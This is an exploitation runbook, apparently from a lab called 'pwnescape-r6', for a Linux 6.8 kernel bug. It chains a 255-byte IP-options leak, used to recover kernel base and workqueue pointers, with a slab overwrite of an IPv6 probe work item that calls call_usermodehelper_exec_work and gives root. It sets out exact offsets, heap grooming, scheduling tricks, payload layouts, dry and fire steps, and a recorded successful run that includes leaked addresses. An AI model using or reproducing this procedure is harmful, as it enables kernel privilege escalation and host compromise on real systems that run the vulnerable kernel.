# r6 observer-free 255B leak → workqueue dry/fire — minimal runbook

Status: **proven on pwnescape-r6, 6.8.0-139, 2026-10-19 14:14Z**
(`/tmp/pwned` = uid=0, sha256 `5ef391d886d04116cf84b584ae37ef136f83950ab69b7bfb2a6da7506f7b3a57`).
Lab frozen after the run: no reboot, no further frames.

## Model (read this first)

**Host-fixture, NOT strict guest-only.**

* Host `iptables -t mangle -A INPUT -p tcp --dport 7778 -j CHECKSUM
  --checksum-fill` is the post-compile option-length writer.
* Host listener `0.0.0.0:7778`, host IPv6 probe (nexthop-object route to a
  FAILED neighbour), host CPU7 scheduling fixtures.
* `r6obs` (CO-RE) is used for geometry and the `QUEUE`/`ECHO`/`EXEC` abort
  checks.  **Payload workqueue values (`data`, `entry`, `func`/KASLR) come from
  the guest-visible 255-byte SYN-ACK window, not from `r6obs`.**
* The 255-byte leak itself is guest-visible (captured inside the L2 guest).

Kernel: 6.8.0-139-generic, pre-fix `ip_check_csum_start`.
`WORK_STRUCT_WQ_DATA_MASK = ~0xff` (`CONFIG_DEBUG_OBJECTS` off).
`pool_workqueue`: `wq` +8, `stats[8]` +184, aligned 256, size 512.
`workqueue_struct`: `name[24]` +176, `flags` +256.

## 0. Preconditions

1. Fresh boot; run the two-site gate:

   ```bash
   sudo bash /opt/pwnescape/tools/r6veth_up.sh      # r6a/r6b, src 172.31.99.2
   sudo python3 /opt/pwnescape/tools/r6_host_gate2.py 10 0x7b00
   ```

   Accept only **ELIGIBLE with hit=N** (the dopt cache must equal the
   nexthop-object work site N; on the proven boot `dopt=11`, `siteE=01`,
   `siteN=11`).  A plain `via fe80::` route is site E and will put the work in
   the wrong cache even when the gate is eligible.
2. Host fixtures: listener 7778, mangle CHECKSUM rule, `router_probe_interval=10`,
   nexthop-object route + `nud failed` neighbour, `gc_thresh` raised, kworkers
   CPU7 → `SCHED_IDLE`, sender pinned CPU7 at `SCHED_FIFO 50` for each write.
3. For the guest capture: L2 up, `enp1s0` 192.168.250.114; guest sniffers see
   packets before its `-p tcp --sport 7778 -j DROP` rule.

## 1. Leak — 255-byte window (read-only)

Allocation geometry, in `r6obs` ECHO terms (`dopt = ip_options_rcu+16`, so
`slot = ECHO-16`):

```
[ S_b : overflower dopt ][ S_v : live victim dopt ][ S_w : rt6 work ]
S_v = S_b + 64,  S_w = S_v + 64
```

1. Send ~40 victim SYNs with valid 12-byte RR options (IHL=32), distinct
   sports, to the host listener.  Read the ECHO map (`sport -> slot`).
   Pick the **page of the last ECHO** (the active slab) and a triple with
   `S_b = S_v-64`, `S_w = S_v+64` all present.  Keep ~40 objects: a completely
   full 64-slot page lets the active slab move, and the work will land
   elsewhere (observed abort).
2. Build the read overflower at `S_b`: `wire=0x4000`, 64-byte echo.  Its copy
   covers `S_b+32..S_b+95 = S_v-32..S_v+31`, i.e. it stops at `S_v+31` and
   does not touch the work.  Set the TCP payload so that
   `payload[24] = 0xff` (source offset 56 = `S_v+24` = `ip_options.optlen`),
   `payload[16..23] = 0`, `payload[25..31] = 0`.
3. `RST S_w` (free the successor), then trigger the site-N probe so the rt6
   work is allocated at `S_w`; then `RST S_b` and send the overflower so its
   dopt reuses `S_b` and performs the 64-byte echo.
4. Send a **pure duplicate SYN of the victim** (`seq == rcv_isn`, SYN only).
   `tcp_check_req()` takes the pure-retransmit branch → `inet_rtx_syn_ack()`
   → `tcp_v4_send_synack()` with the stored `ireq_opt` (`optlen=255`) →
   `ip_options_build()` copies 255 bytes from `S_v+32`.
5. Capture the SYN-ACK at the guest.  The malformed header has the TCP header
   at `IP+20+255` (do not filter TCP at IP+20).  Window = `ip[20:275]`;
   `window[32:64]` is the work header:

   ```
   data      = window[32:40]      pwq = data & ~0xff
   entry.next= window[40:48]      poolhead
   entry.prev= window[48:56]
   func      = window[56:64]      kbase = func - 0x10cbfd0
   pool      = entry.next - 40    (offsetof(worker_pool, worklist); optional)
   ```

   Accept only if all four match the live work (`data & ~0xff == pwq`,
   `entry` links `== &pool->worklist`, `func == rt6_probe_deferred`).
   A dequeued work shows a shifted pool-ID `data` and self-linked `entry`.

Working test: `r6read.py 40 0x7c30`; guest sniffer `r6guestsniff.py`.

## 2. Dry → fire (one FIFO section per write)

For each write, use a **fresh adjacent `[V][W]` pair** from the same victim
batch (disjoint slots; `W=V+64`).  `V` is the victim whose slot the overflower
will reuse; `W` is the freed successor that receives the work.

```
RST W;  probe6(gw);  RST V;  overflower at V (wire/payload)
```

* `RST W` frees `W`; the probe's kmalloc-64 work takes it (fast path).
* `RST V` frees `V`; the overflower's dopt takes it (LIFO) and its echo starts
  at `V+32 = W-32`.  The 64-byte echo's TCP payload bytes 0..31 land at
  `W..W+31` (the work header).
* **All four frames must be in the same `SCHED_FIFO` section.**  Do not split
  "probe → check → overflow": the kworker runs in the gap.

Payload (values from §1):

```
data  = pwq | 5
entry.next = entry.prev = poolhead
dry  func = kbase + 0x126c330   (__x86_return_thunk)
fire func = kbase + 0x12ec10    (call_usermodehelper_exec_work)
```

DRY (`wire=0x4000`, 64 B): `data/entry/func=ret_thunk`.
PASS requires: `QUEUE work==W`, `ECHO dopt==V` (ECHO value `V+16`),
`EXEC func==ret_thunk`, and **no** `/tmp/pwned`.

FIRE (`wire=0xE000`, 192 B): same `data/entry`, `func=exec_work`, plus the
`subprocess_info` fields at `W+32..191` (path `W+128`, argv `W+160`, envp
`W+184`, wait=2).  Use a second fresh pair and a second aged gateway.
PASS requires: `QUEUE work==W`, `ECHO dopt==V`, `EXEC=exec_work`,
`/tmp/pwned` = uid=0.

### First-dry abort lesson (recorded)

A split attempt (probe; check; overflow) produced:

```
QUEUE ts ...808503
EXEC  ts ...848058    (+39.5 us, func=rt6_probe_deferred)
ECHO  ts ...196044    (+347 us after EXEC)
```

The work was already dequeued before the copy; dry aborted, no fire.  The
single-section run then passed.

## 3. Guest-visible self-check (read-only validated)

The 255B window can replace the `QUEUE`/`ECHO` abort checks, but not the slot
addresses or `EXEC`.

Offsets: 32 `data`, 40 `entry.next`, 48 `entry.prev`, 56 `func`,
64..79 `target` (`fe80::<gw>`), 80..87 `dev`.

* **queued**: `(data & 0x5)==0x5`; `pwq=data&~0xff` 256-aligned/canonical;
  `next==prev`, canonical, and `(next & 0x3f) != 0x08` (the self-link `W+8`
  appears only after `list_del_init`, i.e. after the func snapshot);
  `func` text with `kbase=func-0x10cbfd0` 2 MiB-aligned; `target==fe80::gw`;
  window[0..2] = `07 0b 0c`.
* **W=V+64**: `target` at window offset 64 is our gateway, so the work at
  window offset 32 is `V+64`.  This proves the relation, not the numeric
  `V/W`.
* **dequeued**: `data` = shifted pool ID (`0x1c0` for pool 14), no PWQ bit;
  `entry.next==entry.prev==W+8`.
* **freed/reused**: `data` small/zero, `entry` random/zero, `func` zero.

Limits: the window proves on-list/PWQ at sample time; the strict pre-2566
guarantee still comes from the single FIFO section (the worker cannot run).
`EXEC` is not guest-visible for `ret_thunk`; the fire's `/tmp/pwned` is the
execution proof.  Absolute `V/W` addresses are **not** in the window, so an
ECHO/slot-address source is still required for the payload self-pointers.

Validated: positive site-N PASS, post-dequeue FAIL (`data=0x1c0`,
`entry=W+8`), negative site-E FAIL.  See `DATAS/r6/observer-free-255b/
SELFCHECK-RUN.md`.

---

## 3. Abort criteria

Abort and do not fire on any of:

* `QUEUE work != W` (work missed the freed slot);
* overflower `ECHO dopt != V` (the copy hit another slot);
* `EXEC func` not the expected function (work already dequeued or copy missed);
* no 255-byte window / window does not match the live work;
* any anomaly, loss of SSH, or ping loss.

Never send `0xFF00`.  Never send `0xE000` before the dry PASS.  Re-derive
`pwq/poolhead/kbase` and `W/V` every boot.

## 4. Proven run

```
boot: dopt=11 siteN=11 ELIGIBLE
leak: pwq=0xffff8b25801d9e00 poolhead=0xffff8b28efdb43a8
      kbase=0xffffffff8cc00000
dry : V=0xffff8b2586508040 W=0xffff8b2586508080
      QUEUE work=W, ECHO dopt=V+16, EXEC=__x86_return_thunk
fire: V=0xffff8b2586508300 W=0xffff8b2586508340
      QUEUE work=W, ECHO dopt=V+16, EXEC=call_usermodehelper_exec_work
      /tmp/pwned uid=0 sha256 5ef391d8...
```

## 5. Evidence / frozen state

```
DATAS/r6/observer-free-255b/FIRE-RUN.md
DATAS/r6/observer-free-255b/SELFCHECK-RUN.md    (queued/post/negative)
DATAS/r6/observer-free-255b/selfcheck-guest.txt
DATAS/r6/observer-free-255b/r6selfcheck.py r6selfcheck_guest.py
DATAS/r6/observer-free-255b/PROVENANCE.txt     (window -> constants; all PASS)
DATAS/r6/observer-free-255b/kallsyms-provenance.txt
DATAS/r6/observer-free-255b/r6provenance.py
DATAS/r6/observer-free-255b/FROZEN-STATE.txt   (pwned, ruleset, routes, sysctls)
DATAS/r6/observer-free-255b/pwned-and-obs-fire.log
DATAS/r6/observer-free-255b/obs-fire.log
DATAS/r6/observer-free-255b/pwned-observer-free.txt
DATAS/r6/observer-free-255b/guestwin.txt       (guest-captured 255B windows)
DATAS/r6/observer-free-255b/obs-7c30.log       (leak ground truth)
DATAS/r6/observer-free-255b/r6read.py r6fire.py r6guestsniff.py
NOTES/2026-10-19-r7-observer-free-r6.md
```

Lab: pwnescape-r6 frozen after 14:14Z; `/tmp/pwned` present; no reboot; no
r6obs/bpftrace; mangle CHECKSUM rule + listener + routes preserved.
